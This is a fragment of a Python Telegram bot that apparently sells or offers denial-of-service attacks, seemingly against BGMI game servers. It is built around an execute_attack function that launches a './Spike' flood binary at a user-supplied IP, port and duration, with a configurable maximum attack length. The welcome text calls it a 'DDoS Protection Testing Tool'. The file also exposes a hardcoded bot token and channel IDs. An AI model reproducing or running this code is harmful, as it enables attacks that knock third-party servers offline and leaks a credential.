...
TOKEN = '7787664106:AAEuwhyu2JMALANhncCVcDMdpJadxpxBnNQ'  # Replace with your actual bot token
CHANNEL_ID = '-1002548815155'  # Replace with your specific channel or group ID for attacks
FEEDBACK_CHANNEL_ID = '-1002548910926'  # Replace with your specific channel ID for feedback
message_queue = []


# Official channel details
OFFICIAL_CHANNEL = "@SERVER_FREEZ_677"  # Replace with your channel username or ID
CHANNEL_LINK = "https://t.me/SERVER_FREEZ_677"  # Replace with your channel link
...
# Configuration
MAX_ATTACK_DURATION = 240  # Maximum attack duration in seconds (e.g., 200 seconds = 3.20 minutes)
...
def bgmi_command(message):
    ...
    try:
        ...
        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/SERVER_FREEZ_677"))
...
async def execute_attack(ip, port, duration, username):
    ...
    try:
        ...
        proc = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 2 900",
...
def send_welcome(message):
    ...
    *_A Powerful DDoS Protection Testing Tool_*
    ...
    markup.add(
        ...
        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/SERVER_FREEZ_677')
    )
...
def send_help(message):
    ...
    📌 *Need Help?*
    Contact support: @SERVER_FREEZ_677
    ...
    markup.add(
        ...
        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/SERVER_FREEZ_677')
    )
